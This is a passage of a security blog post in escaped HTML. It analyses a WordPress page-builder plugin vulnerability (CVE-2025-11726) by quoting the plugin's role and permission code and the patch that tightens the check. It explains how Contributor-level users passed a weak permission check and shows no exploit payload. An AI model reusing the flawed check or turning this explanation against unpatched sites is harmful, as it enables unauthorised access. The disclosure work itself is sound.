class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role_key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role_key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role_key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role_key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_saved_settings&lt;/code&gt; normalizes the role-based permission settings from the &lt;code&gt;_fl_builder_user_access&lt;/code&gt; option, applying defaults for each &lt;code&gt;$key&lt;/code&gt; and &lt;code&gt;role&lt;/code&gt;, and caches them in &lt;code&gt;self::$settings&lt;/code&gt;. Roles are retrieved via &lt;code&gt;self::get_all_roles()&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;get_all_roles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;function_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;get_editable_roles&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ABSPATH&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-admin/includes/user.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$editable_roles&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_editable_roles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$roles&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$caps&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl_builder_user_access_capabilities&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;edit_posts&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$editable_roles&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$caps&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$cap&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;capabilities&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$cap&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;capabilities&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$cap&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$roles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$roles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_all_roles()&lt;/code&gt; returns a list of &lt;strong&gt;roles with a specific capability&lt;/strong&gt;, defaulting to &lt;code&gt;edit_posts&lt;/code&gt; — effectively including all roles &lt;strong&gt;from Contributor and above&lt;/strong&gt;. &lt;mark class=&#34;mark-default&#34;&gt;This is the explanation&lt;/mark&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v2.9.4.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;check_permission&lt;/code&gt; is replaced with &lt;code&gt;check_write_permission&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff1.png&#34; title=&#34;Using check_write_permission instead of check_permission&#34; data-thumbnail=&#34;/posts/2025-12-07-cve-2025-11726/diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff1&lt;/h2&gt;&lt;p&gt;Using check_write_permission instead of check_permission&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff1.png&#39; alt=&#34;Diff1&#34; height=&#34;625&#34; width=&#34;1832&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Using check_write_permission instead of check_permission&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;It requires &lt;strong&gt;both&lt;/strong&gt; internal plugin permissions: &lt;code&gt;unrestricted_editing&lt;/code&gt; and &lt;code&gt;builder_access&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;check_write_permission&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;FLBuilderUserAccess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;unrestricted_editing&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;FLBuilderUserAccess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;builder_access&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These permissions are revised to apply only to &lt;code&gt;administrator&lt;/code&gt; and 